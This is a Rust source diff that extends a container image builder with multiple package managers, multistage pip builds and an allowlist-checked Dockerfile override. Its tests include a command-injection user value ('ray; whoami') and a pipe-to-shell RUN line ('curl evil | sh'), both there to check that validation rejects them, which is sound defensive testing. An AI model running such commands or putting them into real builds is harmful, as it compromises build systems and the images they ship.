@@ -62,26 +62,94 @@ pub const SPEC_LABEL: &str = "dev.artifact-keeper/build-spec";
 // Spec
 // ---------------------------------------------------------------------------
 
-/// What a user asks for. Every list is optional; a spec with only a base
-/// image is a legal (if pointless) retag.
+/// A package manager a spec may install with. The system managers run as
+/// root in the final stage and need the spec to name the `user` the image
+/// runs as afterwards; `pip` moves to a builder stage when `multistage` is
+/// set; `conda` always installs in the final stage.
+#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Serialize, Deserialize, ToSchema)]
+#[serde(rename_all = "lowercase")]
+pub enum PackageManager {
+    Apt,
+    Dnf,
+    Microdnf,
+    Yum,
+    Apk,
+    #[default]
+    Pip,
+    Conda,
+}
+
+impl PackageManager {
+    pub const ALL: [PackageManager; 7] = [
+        PackageManager::Apt,
+        PackageManager::Dnf,
+        PackageManager::Microdnf,
+        PackageManager::Yum,
+        PackageManager::Apk,
+        PackageManager::Pip,
+        PackageManager::Conda,
+    ];
+
+    pub fn as_str(self) -> &'static str {
+        match self {
+            PackageManager::Apt => "apt",
+            PackageManager::Dnf => "dnf",
+            PackageManager::Microdnf => "microdnf",
+            PackageManager::Yum => "yum",
+            PackageManager::Apk => "apk",
+            PackageManager::Pip => "pip",
+            PackageManager::Conda => "conda",
+        }
+    }
+
+    /// Distribution package managers: root, final stage, cleanup after.
+    pub fn is_system(self) -> bool {
+        matches!(
+            self,
+            PackageManager::Apt
+                | PackageManager::Dnf
+                | PackageManager::Microdnf
+                | PackageManager::Yum
+                | PackageManager::Apk
+        )
+    }
+}
+
+/// One install step: which manager, which packages, and for conda which
+/// channels. Groups render in the order given.
+#[derive(Debug, Clone, Default, Serialize, Deserialize, ToSchema, PartialEq, Eq)]
+pub struct PackageGroup {
+    pub manager: PackageManager,
+    #[serde(default)]
+    pub packages: Vec<String>,
+    /// conda channels (`conda-forge`, `bioconda`); conda groups only.
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub channels: Vec<String>,
+}
+
+/// What a user asks for. Either a structured spec (`base_image` plus
+/// package groups, env, labels, user, workdir) or, when the instance allows
+/// it, a whole `dockerfile` the server only checks and stamps.
 #[derive(Debug, Clone, Default, Serialize, Deserialize, ToSchema, PartialEq, Eq)]
 pub struct ImageBuildSpec {
     /// The image to build on (`rayproject/ray:2.56.0`); must match the
-    /// administrator's base allowlist when one is configured.
+    /// administrator's base allowlist when one is configured. Ignored when
+    /// `dockerfile` is set (its FROM lines are checked instead).
+    #[serde(default)]
     pub base_image: String,
-    /// Debian/Ubuntu packages (`libgomp1`, `git=1:2.43.0-1`). Installing needs
-    /// root, so a spec with apt packages must also set `user`.
+    /// Install steps, rendered in order.
     #[serde(default)]
-    pub apt: Vec<String>,
-    /// conda packages (`samtools=1.20`), installed with `conda install`.
+    pub packages: Vec<PackageGroup>,
+    /// Build pip groups in a separate stage and copy only the installed
+    /// packages into the final image, so build tooling and caches never ship.
     #[serde(default)]
-    pub conda: Vec<String>,
-    /// Extra conda channels (`conda-forge`, `bioconda`).
-    #[serde(default)]
-    pub conda_channels: Vec<String>,
-    /// pip requirement specifiers (`scanpy==1.10.2`, `polars>=1.9`).
-    #[serde(default)]
-    pub pip: Vec<String>,
+    pub multistage: bool,
+    /// A complete Dockerfile replacing the structured fields; accepted only
+    /// when `AK_IMAGE_BUILD_ALLOW_DOCKERFILE=true`. Every FROM must match the
+    /// base allowlist; the spec label is appended so inspection still knows
+    /// what the image came from.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub dockerfile: Option<String>,
     /// Environment variables baked into the image.
     #[serde(default)]
     pub env: BTreeMap<String, String>,
@@ -89,16 +157,69 @@ pub struct ImageBuildSpec {
     #[serde(default)]
     pub labels: BTreeMap<String, String>,
     /// The user the image runs as (`ray`, `1000`, `1000:100`). Required
-    /// when apt packages are installed (they run as root).
+    /// when any system package group is present (they install as root).
     #[serde(default)]
     pub user: Option<String>,
     /// Working directory the image starts in.
     #[serde(default)]
     pub workdir: Option<String>,
-    /// Raw `RUN` lines. Refused unless the administrator set
-    /// `AK_IMAGE_BUILD_ALLOW_RUN=true`.
+    /// Raw `RUN` lines. Refused unless `AK_IMAGE_BUILD_ALLOW_RUN=true`.
     #[serde(default)]
     pub run: Vec<String>,
+    // --- Legacy shorthand fields, still accepted (and folded into groups by
+    // `groups()` in the order apt, conda, pip) so specs recorded before
+    // package groups render byte-for-byte the same.
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub apt: Vec<String>,
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub conda: Vec<String>,
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub conda_channels: Vec<String>,
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub pip: Vec<String>,
+}
+
+impl ImageBuildSpec {
+    /// Whether this spec is a whole-Dockerfile override.
+    pub fn is_dockerfile_override(&self) -> bool {
+        self.dockerfile
+            .as_deref()
+            .map(|d| !d.trim().is_empty())
+            .unwrap_or(false)
+    }
+
+    /// The install steps, legacy shorthand fields folded in first (apt,
+    /// conda, pip — the order the legacy renderer used).
+    pub fn groups(&self) -> Vec<PackageGroup> {
+        let mut out = Vec::with_capacity(self.packages.len() + 3);
+        if !self.apt.is_empty() {
+            out.push(PackageGroup {
+                manager: PackageManager::Apt,
+                packages: self.apt.clone(),
+                channels: vec![],
+            });
+        }
+        if !self.conda.is_empty() {
+            out.push(PackageGroup {
+                manager: PackageManager::Conda,
+                packages: self.conda.clone(),
+                channels: self.conda_channels.clone(),
+            });
+        }
+        if !self.pip.is_empty() {
+            out.push(PackageGroup {
+                manager: PackageManager::Pip,
+                packages: self.pip.clone(),
+                channels: vec![],
+            });
+        }
+        out.extend(self.packages.iter().cloned());
+        out
+    }
+
+    fn has_system_group(&self) -> bool {
+        self.groups().iter().any(|g| g.manager.is_system())
+    }
 }
 
 #[derive(Debug, Clone)]
@@ -109,6 +230,8 @@ pub struct ImageBuildSettings {
     pub registry_insecure: bool,
     pub base_allowlist: Vec<String>,
     pub allow_run: bool,
+    /// Accept whole-Dockerfile specs (default false).
+    pub allow_dockerfile: bool,
     pub timeout: Duration,
     pub max_concurrent: usize,
     /// Only administrators may build (default true).
@@ -153,6 +276,7 @@ impl ImageBuildSettings {
                 })
                 .unwrap_or_default(),
             allow_run: truthy(var("AK_IMAGE_BUILD_ALLOW_RUN"), false),
+            allow_dockerfile: truthy(var("AK_IMAGE_BUILD_ALLOW_DOCKERFILE"), false),
             timeout: Duration::from_secs(
                 var("AK_IMAGE_BUILD_TIMEOUT_SECS")
                     .and_then(|v| v.parse().ok())
@@ -167,13 +291,26 @@ impl ImageBuildSettings {
         }
     }
 
+    pub fn enabled(&self) -> bool {
+        self.buildkit_addr.is_some() && self.push_registry.is_some()
+    }
+
     /// Whether this caller may build on this instance.
     pub fn caller_may_build(&self, is_admin: bool) -> bool {
         !self.admin_only || is_admin
     }
 
-    pub fn enabled(&self) -> bool {
-        self.buildkit_addr.is_some() && self.push_registry.is_some()
+    /// The managers a spec may use here, for the UI's dropdown.
+    pub fn supported_managers(&self) -> Vec<&'static str> {
+        PackageManager::ALL.iter().map(|m| m.as_str()).collect()
+    }
+
+    fn base_allowed(&self, image: &str) -> bool {
+        self.base_allowlist.is_empty()
+            || self
+                .base_allowlist
+                .iter()
+                .any(|p| image.starts_with(p.as_str()))
     }
 }
 
@@ -188,6 +325,8 @@ fn re(cell: &'static OnceLock<Regex>, pattern: &str) -> &'static Regex {
 static IMAGE_REF_RE: OnceLock<Regex> = OnceLock::new();
 static PIP_RE: OnceLock<Regex> = OnceLock::new();
 static APT_RE: OnceLock<Regex> = OnceLock::new();
+static RPM_RE: OnceLock<Regex> = OnceLock::new();
+static APK_RE: OnceLock<Regex> = OnceLock::new();
 static CONDA_RE: OnceLock<Regex> = OnceLock::new();
 static CHANNEL_RE: OnceLock<Regex> = OnceLock::new();
 static ENV_KEY_RE: OnceLock<Regex> = OnceLock::new();
@@ -195,6 +334,7 @@ static LABEL_KEY_RE: OnceLock<Regex> = OnceLock::new();
 static USER_RE: OnceLock<Regex> = OnceLock::new();
 static NAME_RE: OnceLock<Regex> = OnceLock::new();
 static TAG_RE: OnceLock<Regex> = OnceLock::new();
+static FROM_RE: OnceLock<Regex> = OnceLock::new();
 
 fn image_ref_re() -> &'static Regex {
     re(
@@ -210,6 +350,19 @@ fn pip_re() -> &'static Regex {
 }
 fn apt_re() -> &'static Regex {
     re(&APT_RE, r"^[a-z0-9][a-z0-9.+-]*(?:=[A-Za-z0-9.:~+-]+)?$")
+}
+/// dnf / microdnf / yum: `name`, `name-1.2`, `name-1.2-3.el9`, `name.x86_64`.
+fn rpm_re() -> &'static Regex {
+    re(
+        &RPM_RE,
+        r"^[A-Za-z0-9][A-Za-z0-9._+-]*(?:-[0-9][A-Za-z0-9._:~+-]*)?$",
+    )
+}
+fn apk_re() -> &'static Regex {
+    re(
+        &APK_RE,
+        r"^[a-z0-9][a-z0-9._+-]*(?:[=~<>]{1,2}[A-Za-z0-9._+-]+)?$",
+    )
 }
 fn conda_re() -> &'static Regex {
     re(
@@ -242,9 +395,63 @@ pub fn image_name_re() -> &'static Regex {
 pub fn tag_re() -> &'static Regex {
     re(&TAG_RE, r"^[A-Za-z0-9_][A-Za-z0-9._-]{0,127}$")
 }
+/// `FROM [--platform=…] <image> [AS <alias>]`, case-insensitive, per line.
+fn from_re() -> &'static Regex {
+    re(
+        &FROM_RE,
+        r"(?im)^\s*FROM\s+(?:--platform=\S+\s+)?(\S+)(?:\s+AS\s+(\S+))?\s*$",
+    )
+}
 
 fn invalid(msg: impl Into<String>) -> AppError {
     AppError::Validation(msg.into())
+}
+
+/// Maximum Dockerfile override size.
+const MAX_DOCKERFILE_BYTES: usize = 64 * 1024;
+
+/// The base images a Dockerfile override builds on: every `FROM` that does
+/// not name an earlier stage's alias (and is not `scratch`).
+pub fn dockerfile_base_images(dockerfile: &str) -> Vec<String> {
+    let mut aliases: Vec<String> = Vec::new();
+    let mut bases = Vec::new();
+    for cap in from_re().captures_iter(dockerfile) {
+        let image = cap[1].to_string();
+        let is_alias = aliases.iter().any(|a| a.eq_ignore_ascii_case(&image));
+        if !is_alias && image != "scratch" {
+            bases.push(image);
+        }
+        if let Some(alias) = cap.get(2) {
+            aliases.push(alias.as_str().to_string());
+        }
+    }
+    bases
+}
+
+fn validate_package(manager: PackageManager, p: &str) -> Result<()> {
+    let ok = match manager {
+        PackageManager::Apt => apt_re().is_match(p),
+        PackageManager::Dnf | PackageManager::Microdnf | PackageManager::Yum => {
+            rpm_re().is_match(p)
+        }
+        PackageManager::Apk => apk_re().is_match(p),
+        PackageManager::Pip => pip_re().is_match(p.trim()),
+        PackageManager::Conda => conda_re().is_match(p),
+    };
+    if ok {
+        Ok(())
+    } else {
+        let noun = if manager == PackageManager::Pip {
+            "requirement"
+        } else {
+            "package"
+        };
+        Err(invalid(format!(
+            "{} {noun} {p:?} is not a valid {} {noun} spec",
+            manager.as_str(),
+            manager.as_str()
+        )))
+    }
 }
 
 /// Refuse anything the renderer could not turn into a safe Containerfile
@@ -252,6 +459,57 @@ fn invalid(msg: impl Into<String>) -> AppError {
 /// worth showing next to the rendered file.
 pub fn validate_spec(spec: &ImageBuildSpec, settings: &ImageBuildSettings) -> Result<Vec<String>> {
     let mut warnings = Vec::new();
+    if spec.is_dockerfile_override() {
+        if !settings.allow_dockerfile {
+            return Err(invalid(
+                "a Dockerfile override is not enabled on this instance (AK_IMAGE_BUILD_ALLOW_DOCKERFILE)",
+            ));
+        }
+        let text = spec.dockerfile.as_deref().unwrap_or_default();
+        if text.len() > MAX_DOCKERFILE_BYTES {
+            return Err(invalid(format!(
+                "dockerfile is larger than {MAX_DOCKERFILE_BYTES} bytes"
+            )));
+        }
+        if text.contains('\0') {
+            return Err(invalid("dockerfile must not contain NUL bytes"));
+        }
+        let bases = dockerfile_base_images(text);
+        if bases.is_empty() {
+            return Err(invalid("dockerfile has no FROM instruction"));
+        }
+        for base in &bases {
+            let unpinned = base.trim_start_matches('$');
+            if base.contains('$') {
+                return Err(invalid(format!(
+                    "FROM {base:?} uses a variable; name the base image literally so it can be checked"
+                )));
+            }
+            if !image_ref_re().is_match(unpinned) {
+                return Err(invalid(format!(
+                    "FROM {base:?} is not a valid image reference"
+                )));
+            }
+            if !settings.base_allowed(unpinned) {
+                return Err(invalid(format!(
+                    "FROM {base:?} is not under an allowed prefix ({})",
+                    settings.base_allowlist.join(", ")
+                )));
+            }
+        }
+        if !spec.groups().is_empty() || !spec.env.is_empty() || !spec.run.is_empty() {
+            warnings.push(
+                "a Dockerfile override ignores the structured fields (packages, env, run)"
+                    .to_string(),
+            );
+        }
+        warnings.push(
+            "a Dockerfile override is not reviewed by the builder; the scan gate is your check"
+                .to_string(),
+        );
+        return Ok(warnings);
+    }
+
     let base = spec.base_image.trim();
     if base.is_empty() {
         return Err(invalid("base_image is required"));
@@ -261,12 +519,7 @@ pub fn validate_spec(spec: &ImageBuildSpec, settings: &ImageBuildSettings) -> Re
             "base_image {base:?} is not a valid image reference"
         )));
     }
-    if !settings.base_allowlist.is_empty()
-        && !settings
-            .base_allowlist
-            .iter()
-            .any(|p| base.starts_with(p.as_str()))
-    {
+    if !settings.base_allowed(base) {
         return Err(invalid(format!(
             "base_image {base:?} is not under an allowed prefix ({})",
             settings.base_allowlist.join(", ")
@@ -275,37 +528,35 @@ pub fn validate_spec(spec: &ImageBuildSpec, settings: &ImageBuildSettings) -> Re
     if !base.contains(':') && !base.contains('@') {
         warnings.push("base_image has no tag: `latest` is implied and moves under you".to_string());
     }
-    for p in &spec.apt {
-        if !apt_re().is_match(p) {
+    let groups = spec.groups();
+    for (i, g) in groups.iter().enumerate() {
+        if g.packages.is_empty() {
             return Err(invalid(format!(
-                "apt package {p:?} is not a valid Debian package spec"
+                "package group {} ({}) lists no packages",
+                i + 1,
+                g.manager.as_str()
             )));
         }
-    }
-    for p in &spec.conda {
-        if !conda_re().is_match(p) {
+        for p in &g.packages {
+            validate_package(g.manager, p)?;
+            if g.manager == PackageManager::Pip && !p.contains("==") && !p.contains("===") {
+                warnings.push(format!(
+                    "pip requirement {p:?} is not pinned to an exact version"
+                ));
+            }
+        }
+        if !g.channels.is_empty() && g.manager != PackageManager::Conda {
             return Err(invalid(format!(
-                "conda package {p:?} is not a valid conda match spec"
+                "channels are only meaningful for conda (group {})",
+                i + 1
             )));
         }
-    }
-    for c in &spec.conda_channels {
-        if !channel_re().is_match(c) {
-            return Err(invalid(format!(
-                "conda channel {c:?} is not a valid channel name"
-            )));
-        }
-    }
-    for p in &spec.pip {
-        if !pip_re().is_match(p.trim()) {
-            return Err(invalid(format!(
-                "pip requirement {p:?} is not a valid requirement specifier (name[extras]==version)"
-            )));
-        }
-        if !p.contains("==") && !p.contains("===") {
-            warnings.push(format!(
-                "pip requirement {p:?} is not pinned to an exact version"
-            ));
+        for c in &g.channels {
+            if !channel_re().is_match(c) {
+                return Err(invalid(format!(
+                    "conda channel {c:?} is not a valid channel name"
+                )));
+            }
         }
     }
     for (k, v) in &spec.env {
@@ -341,10 +592,13 @@ pub fn validate_spec(spec: &ImageBuildSpec, settings: &ImageBuildSettings) -> Re
             )));
         }
     }
-    if !spec.apt.is_empty() && spec.user.is_none() {
+    if spec.has_system_group() && spec.user.is_none() {
         return Err(invalid(
-            "apt packages install as root; set `user` to the account the image should run as afterwards",
+            "system packages install as root; set `user` to the account the image should run as afterwards",
         ));
+    }
+    if spec.multistage && !groups.iter().any(|g| g.manager == PackageManager::Pip) {
+        warnings.push("multistage has no effect without a pip group".to_string());
     }
     if !spec.run.is_empty() {
         if !settings.allow_run {
@@ -387,6 +641,75 @@ fn sq(s: &str) -> String {
     format!("'{}'", s.replace('\'', "'\\''"))
 }
 
+/// Where the builder stage installs pip packages in a multistage build, and
+/// what the final image imports them from.
+pub const PIP_STAGE_TARGET: &str = "/opt/ak/site-packages";
+
+fn push_packages(out: &mut String, packages: &[String]) {
+    for p in packages {
+        out.push_str(" \\\n        ");
+        out.push_str(&sq(p.trim()));
+    }
+}
+
+/// The `RUN` line for one package group. `pip_target` is Some in the
+/// builder stage of a multistage build.
+fn render_group(
+    out: &mut String,
+    g: &PackageGroup,
+    pip_index_url: Option<&str>,
+    pip_target: Option<&str>,
+) {
+    match g.manager {
+        PackageManager::Apt => {
+            out.push_str(
+                "RUN apt-get update \\\n    && apt-get install -y --no-install-recommends",
+            );
+            push_packages(out, &g.packages);
+            out.push_str(" \\\n    && rm -rf /var/lib/apt/lists/*\n");
+        }
+        PackageManager::Dnf => {
+            out.push_str("RUN dnf install -y --setopt=install_weak_deps=False");
+            push_packages(out, &g.packages);
+            out.push_str(" \\\n    && dnf clean all\n");
+        }
+        PackageManager::Microdnf => {
+            out.push_str("RUN microdnf install -y --setopt=install_weak_deps=0");
+            push_packages(out, &g.packages);
+            out.push_str(" \\\n    && microdnf clean all\n");
+        }
+        PackageManager::Yum => {
+            out.push_str("RUN yum install -y");
+            push_packages(out, &g.packages);
+            out.push_str(" \\\n    && yum clean all\n");
+        }
+        PackageManager::Apk => {
+            out.push_str("RUN apk add --no-cache");
+            push_packages(out, &g.packages);
+            out.push('\n');
+        }
+        PackageManager::Conda => {
+            out.push_str("RUN conda install -y");
+            for c in &g.channels {
+                out.push_str(&format!(" -c {}", sq(c)));
+            }
+            push_packages(out, &g.packages);
+            out.push_str(" \\\n    && conda clean -afy\n");
+        }
+        PackageManager::Pip => {
+            out.push_str("RUN pip install --no-cache-dir");
+            if let Some(index) = pip_index_url.map(str::trim).filter(|u| !u.is_empty()) {
+                out.push_str(&format!(" --index-url {}", sq(index)));
+            }
+            if let Some(target) = pip_target {
+                out.push_str(&format!(" --target {}", target));
+            }
+            push_packages(out, &g.packages);
+            out.push('\n');
+        }
+    }
+}
+
 /// Render the Containerfile for a validated spec. Deterministic: the same
 /// spec (and instance settings) always yields the same bytes, so the
 /// preview a user approved is exactly what gets built.
@@ -398,42 +721,53 @@ pub fn render_containerfile(spec: &ImageBuildSpec) -> String {
 /// `pip install` is pinned to it so package egress goes through the
 /// registry's own PyPI proxy rather than the public index.
 pub fn render_containerfile_with(spec: &ImageBuildSpec, pip_index_url: Option<&str>) -> String {
+    let spec_json = serde_json::to_string(spec).unwrap_or_default();
+    let spec_label = format!("LABEL {}={}\n", dq(SPEC_LABEL), dq(&spec_json));
+
+    if let Some(text) = spec.dockerfile.as_deref().filter(|d| !d.trim().is_empty()) {
+        // The user's file, verbatim, plus the stamp that says what it was
+        // built from. A trailing LABEL applies to the final stage.
+        let mut out = String::from(text.trim_end());
+        out.push('\n');
+        out.push_str(&spec_label);
+        return out;
+    }
+
+    let base = spec.base_image.trim();
+    let groups = spec.groups();
+    let has_pip = groups.iter().any(|g| g.manager == PackageManager::Pip);
+    let multistage = spec.multistage && has_pip;
+
     let mut out = String::new();
     out.push_str("# syntax=docker/dockerfile:1\n");
     out.push_str("# Generated by Artifact Keeper's image builder from a structured spec.\n");
     out.push_str("# Do not edit: change the spec and rebuild.\n");
-    out.push_str(&format!("FROM {}\n", spec.base_image.trim()));
-    let switch_user = !spec.apt.is_empty();
-    if switch_user {
-        out.push_str("USER root\n");
-        out.push_str("RUN apt-get update \\\n    && apt-get install -y --no-install-recommends");
-        for p in &spec.apt {
-            out.push_str(" \\\n        ");
-            out.push_str(&sq(p));
-        }
-        out.push_str(" \\\n    && rm -rf /var/lib/apt/lists/*\n");
-    }
-    if !spec.conda.is_empty() {
-        out.push_str("RUN conda install -y");
-        for c in &spec.conda_channels {
-            out.push_str(&format!(" -c {}", sq(c)));
-        }
-        for p in &spec.conda {
-            out.push_str(" \\\n        ");
-            out.push_str(&sq(p));
-        }
-        out.push_str(" \\\n    && conda clean -afy\n");
-    }
-    if !spec.pip.is_empty() {
-        out.push_str("RUN pip install --no-cache-dir");
-        if let Some(index) = pip_index_url.map(str::trim).filter(|u| !u.is_empty()) {
-            out.push_str(&format!(" --index-url {}", sq(index)));
-        }
-        for p in &spec.pip {
-            out.push_str(" \\\n        ");
-            out.push_str(&sq(p.trim()));
+    if multistage {
+        out.push_str(&format!("FROM {} AS builder\n", base));
+        for g in groups.iter().filter(|g| g.manager == PackageManager::Pip) {
+            render_group(&mut out, g, pip_index_url, Some(PIP_STAGE_TARGET));
         }
         out.push('\n');
+    }
+    out.push_str(&format!("FROM {}\n", base));
+    let mut switched_to_root = false;
+    for g in &groups {
+        if g.manager == PackageManager::Pip && multistage {
+            continue;
+        }
+        if g.manager.is_system() && !switched_to_root {
+            out.push_str("USER root\n");
+            switched_to_root = true;
+        }
+        render_group(&mut out, g, pip_index_url, None);
+    }
+    if multistage {
+        out.push_str(&format!("COPY --from=builder {0} {0}\n", PIP_STAGE_TARGET));
+        out.push_str(&format!(
+            "ENV PYTHONPATH={0}${{PYTHONPATH:+:$PYTHONPATH}}\n",
+            PIP_STAGE_TARGET
+        ));
+        out.push_str(&format!("ENV PATH={0}/bin:$PATH\n", PIP_STAGE_TARGET));
     }
     for r in &spec.run {
         out.push_str(&format!("RUN {}\n", r.trim()));
@@ -444,8 +778,7 @@ pub fn render_containerfile_with(spec: &ImageBuildSpec, pip_index_url: Option<&s
     for (k, v) in &spec.labels {
         out.push_str(&format!("LABEL {}={}\n", dq(k), dq(v)));
     }
-    let spec_json = serde_json::to_string(spec).unwrap_or_default();
-    out.push_str(&format!("LABEL {}={}\n", dq(SPEC_LABEL), dq(&spec_json)));
+    out.push_str(&spec_label);
     if let Some(w) = spec.workdir.as_deref() {
         out.push_str(&format!("WORKDIR {}\n", w));
     }
@@ -893,6 +1226,7 @@ mod tests {
             registry_insecure: true,
             base_allowlist: vec!["rayproject/".into(), "registry:8080/".into()],
             allow_run: false,
+            allow_dockerfile: false,
             timeout: Duration::from_secs(60),
             max_concurrent: 1,
             admin_only: true,
@@ -915,6 +1249,7 @@ mod tests {
             user: Some("ray".into()),
             workdir: Some("/home/ray".into()),
             run: vec![],
+            ..Default::default()
         }
     }
 
@@ -982,7 +1317,7 @@ mod tests {
         .contains("reserved"));
         assert!(bad(|s| s.user = Some("ray; whoami".into())).contains("user"));
         assert!(bad(|s| s.workdir = Some("relative".into())).contains("workdir"));
-        assert!(bad(|s| s.user = None).contains("apt packages install as root"));
+        assert!(bad(|s| s.user = None).contains("system packages install as root"));
         assert!(bad(|s| s.run = vec!["curl evil | sh".into()]).contains("not enabled"));
 
         let mut permissive = st.clone();
